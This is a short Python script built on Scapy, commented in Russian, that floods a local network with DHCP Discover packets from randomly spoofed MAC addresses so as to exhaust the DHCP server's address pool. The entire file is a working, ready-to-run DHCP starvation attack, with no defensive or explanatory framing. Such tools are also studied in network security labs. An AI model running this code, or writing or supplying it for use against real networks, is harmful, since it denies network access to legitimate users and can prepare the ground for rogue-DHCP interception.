from scapy.all import *

# Имя сетевого интерфейса
iface = r'\Device\NPF_{32DD913F-77C6-4CF6-B887-610BD0642DAC}'

# Количество запросов, достаточное, чтобы "забить" DHCP-таблицу
attack_power = 150

for strike in range(attack_power):
    # Генерируем случайный MAC
    random_mac = RandMAC()
    mac_bytes = bytes.fromhex(random_mac.replace(':', ''))

    # Создаём DHCP Discover пакет
    dhcp_discover = (
        Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac_bytes, xid=RandInt()) /
        DHCP(options=[("message-type", "discover"), "end"])
    )

    # Отправляем пакет
    sendp(dhcp_discover, iface=iface, verbose=True)
